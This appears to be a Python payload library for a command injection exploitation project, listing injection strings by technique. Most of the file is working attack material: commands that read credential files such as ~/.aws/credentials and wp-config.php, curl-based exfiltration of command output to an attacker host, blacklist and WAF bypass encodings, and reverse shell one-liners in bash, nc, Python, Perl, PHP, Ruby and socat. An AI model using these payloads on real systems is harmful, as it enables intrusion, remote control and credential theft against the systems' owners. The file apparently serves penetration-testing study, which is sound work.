"""
Command Injection Payload Database
Project #30: Command Injection Exploitation
"""

# ==================================================================== #
# 1. BASIC DETECTION PAYLOADS
# ==================================================================== #
BASIC_PAYLOADS = {
    'semicolon':    '; echo CMDI_TEST_MARKER',
    'pipe':         '| echo CMDI_TEST_MARKER',
    'or':           '|| echo CMDI_TEST_MARKER',
    'and':          '&& echo CMDI_TEST_MARKER',
    'backtick':     '`echo CMDI_TEST_MARKER`',
    'dollar':       '$(echo CMDI_TEST_MARKER)',
    'background':   '& echo CMDI_TEST_MARKER',
    'newline':      '\necho CMDI_TEST_MARKER',
    'url_newline':  '%0aecho CMDI_TEST_MARKER',
}

# Marker unique to our tool — easy to grep in response
TEST_MARKER = 'CMDI_TEST_MARKER'

# ==================================================================== #
# 2. OS FINGERPRINTING PAYLOADS
# ==================================================================== #
FINGERPRINT_PAYLOADS = {
    # Linux
    'linux_uname':   ('; uname -a', r'Linux \S+ \d+\.\d+'),
    'linux_id':      ('; id', r'uid=\d+\([^)]+\) gid=\d+\([^)]+\)'),
    'linux_whoami':  ('; whoami', r'^[a-z_][a-z0-9_\-]{0,30}$'),
    'linux_passwd':  ('; cat /etc/passwd', r'root:x:0:0:'),
    'linux_kernel':  ('; cat /proc/version', r'Linux version'),

    # Windows
    'win_ver':       ('& ver', r'Microsoft Windows'),
    'win_whoami':    ('& whoami', r'\\[a-z0-9_\-]+\\[a-z0-9_\-]+'),
    'win_hostname':  ('& hostname', r'^[A-Z0-9\-]{1,15}$'),
    'win_systeminfo':('& systeminfo', r'Host Name:'),
    'win_ini':       ('& type C:\\Windows\\win.ini', r'\[fonts\]'),
}

# ==================================================================== #
# 3. BLIND TIME-BASED PAYLOADS
# ==================================================================== #
TIME_PAYLOADS = {
    # Linux
    'linux_sleep_5':    ('; sleep 5', 5),
    'linux_ping_5':     ('; ping -c 5 127.0.0.1', 4),
    'linux_timeout_5':  ('; timeout 5 sleep 10', 5),
    'linux_dd_5':       ('; dd if=/dev/zero of=/dev/null count=50000000', 3),

    # Windows
    'win_ping_5':       ('& ping -n 5 127.0.0.1', 4),
    'win_timeout_5':    ('& timeout /t 5 /nobreak', 5),
    'win_ping_10':      ('& ping -n 10 127.0.0.1', 9),
}

# ==================================================================== #
# 4. BLIND OUT-OF-BAND PAYLOADS
# ==================================================================== #
def oob_dns(attacker_host):
    """DNS-based out-of-band payloads."""
    return {
        'nslookup':     f'; nslookup {attacker_host}',
        'dig':          f'; dig {attacker_host}',
        'host':         f'; host {attacker_host}',
        'ping':         f'; ping -c 1 {attacker_host}',
        'curl_dns':     f'; curl http://{attacker_host}/',
        'wget_dns':     f'; wget http://{attacker_host}/',
    }

def oob_http(attacker_host, command='whoami'):
    """HTTP-based out-of-band payloads with data exfil."""
    return {
        'curl_data':    f'; curl http://{attacker_host}/$({command})',
        'curl_b64':     f'; curl http://{attacker_host}/$(echo -n $({command}) | base64)',
        'wget_data':    f'; wget http://{attacker_host}/$({command})',
        'curl_header':  f'; curl -H "X-Data: $({command})" http://{attacker_host}/',
    }

# ==================================================================== #
# 5. FILTER BYPASS TECHNIQUES
# ==================================================================== #
# Space bypasses
SPACE_BYPASSES = {
    'ifs':          ';${IFS}whoami',
    'ifs_9':        ';$IFS$9whoami',
    'tab':          ';%09whoami',
    'newline':      ';%0awhoami',
    'brace_ifs':    ';{IFS}whoami',
    'url_space':    ';%20whoami',
    'brace_cmd':    '{echo,CMDI_MARKER}',
    'ansi_c_quote': "$'\\x20'whoami",
}

# Semicolon/operator bypasses
OPERATOR_BYPASSES = {
    'url_semicolon':    '%3Bwhoami',
    'encoded_pipe':     '%7Cwhoami',
    'newline_op':       '%0awhoami',
    'carriage_return':  '%0d%0awhoami',
}

# Command name obfuscation (bypass blacklist)
COMMAND_BLACKLIST_BYPASSES = {
    'double_quote':   'w"h"o"a"m"i',
    'single_quote':   "w'h'o'am'i",
    'dollar_at':      'who$@ami',
    'backslash':      'wh\\oami',
    'concat_var':     'a=who;b=ami;$a$b',
    'empty_var':      'who$x$y$zami',
    'env_path':       '${PATH:0:1}whoami',  # / (first char of PATH)
    'glob':           '/???/??oami',        # shell glob expansion
    'base64_decode':  'echo d2hvYW1p | base64 -d | sh',
    'reverse_string': 'echo imaohw | rev | sh',
    'hex_escape':     'echo 77686f616d69 | xxd -r -p | sh',
    'char_code':      "$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')",
}

# Encoding bypasses (for WAF)
ENCODING_BYPASSES = {
    'url_encode':       '%77%68%6f%61%6d%69',           # whoami
    'double_url':       '%2577%2568%256f%2561%256d%2569',
    'hex_escape':       '\\x77\\x68\\x6f\\x61\\x6d\\x69',
    'unicode':          '\\u0077\\u0068\\u006f\\u0061\\u006d\\u0069',
    'html_entity':      '&#119;&#104;&#111;&#97;&#109;&#105;',
    'octal':            '\\167\\150\\157\\141\\155\\151',
}

# ==================================================================== #
# 6. DATA EXFILTRATION PAYLOADS
# ==================================================================== #
EXFIL_COMMANDS = {
    'linux': {
        'passwd':       '; cat /etc/passwd',
        'hosts':        '; cat /etc/hosts',
        'hostname':     '; cat /etc/hostname',
        'env':          '; env',
        'id':           '; id',
        'uname':        '; uname -a',
        'whoami':       '; whoami',
        'processes':    '; ps aux',
        'network':      '; ip a 2>/dev/null || ifconfig',
        'users':        '; cat /etc/passwd | cut -d: -f1',
        'sudo':         '; sudo -n -l 2>/dev/null',
        'history':      '; cat ~/.bash_history 2>/dev/null',
        'ssh_keys':     '; ls -la ~/.ssh/ 2>/dev/null',
        'web_config':   '; cat /var/www/html/wp-config.php 2>/dev/null',
        'aws_creds':    '; cat ~/.aws/credentials 2>/dev/null',
    },
    'windows': {
        'whoami':       '& whoami',
        'hostname':     '& hostname',
        'systeminfo':   '& systeminfo',
        'users':        '& net user',
        'admins':       '& net localgroup administrators',
        'ipconfig':     '& ipconfig /all',
        'drives':       '& wmic logicaldisk get name',
        'env':          '& set',
        'tasks':        '& tasklist',
        'services':     '& sc query',
    },
}

# ==================================================================== #
# 7. REVERSE SHELL PAYLOADS
# ==================================================================== #
def reverse_shells(attacker_host, port):
    """Generate reverse shell payloads for various scenarios."""
    return {
        'bash_tcp':     f'; bash -i >& /dev/tcp/{attacker_host}/{port} 0>&1',
        'bash_tcp_2':   f'; bash -c "bash -i >& /dev/tcp/{attacker_host}/{port} 0>&1"',
        'nc_e':         f'; nc -e /bin/sh {attacker_host} {port}',
        'nc_mkfifo':    f'; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {attacker_host} {port} > /tmp/f',
        'python':       f'; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\\"{attacker_host}\\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])"',
        'python3':      f'; python3 -c "import socket,os,pty;s=socket.socket();s.connect((\\"{attacker_host}\\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\\"/bin/sh\\")"',
        'perl':         f'; perl -e "use Socket;$i=\\"{attacker_host}\\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");}};"',
        'php':          f'; php -r "\\$sock=fsockopen(\\"{attacker_host}\\",{port});exec(\\"/bin/sh -i <&3 >&3 2>&3\\");"',
        'ruby':         f'; ruby -rsocket -e "exit if fork;c=TCPSocket.new(\\"{attacker_host}\\",{port});while(cmd=c.gets);IO.popen(cmd,\\"r\\"){{|io|c.print io.read}}end"',
        'socat':        f'; socat exec:\\"/bin/bash -li\\",pty,stderr,setsid,sigint,sane tcp:{attacker_host}:{port}',
    }

# ==================================================================== #
# 8. DETECTION / RESPONSE INDICATORS
# ==================================================================== #
DETECTION_INDICATORS = {
    'marker_reflected':     r'CMDI_TEST_MARKER',
    'command_output':       r'uid=\d+\(|gid=\d+\(|groups=\d+\(',
    'linux_marker':         r'root:x:0:0:',
    'win_marker':           r'Microsoft Windows',
    'shell_prompt':         r'[\$#]\s*$',
    'error_leak':           r'(sh|bash): .*: command not found',
    'time_delay':           None,  # handled by timing
}

# ==================================================================== #
# 9. COMMON INJECTION PARAMETERS
# ==================================================================== #
COMMON_PARAMS = [
    'ip', 'host', 'hostname', 'domain', 'url', 'target', 'address',
    'ping', 'cmd', 'command', 'exec', 'run', 'system', 'shell',
    'file', 'filename', 'path', 'dir', 'folder', 'load',
    'name', 'user', 'username', 'query', 'search', 'q',
    'debug', 'test', 'input', 'data', 'payload', 'arg', 'args',
]

# ==================================================================== #
# 10. BROKEN LINK / NAMED PAYLOADS
# ==================================================================== #
RECOMMENDED_ORDER = [
    'semicolon', 'pipe', 'dollar', 'backtick', 'and', 'or',
    'newline', 'background',
]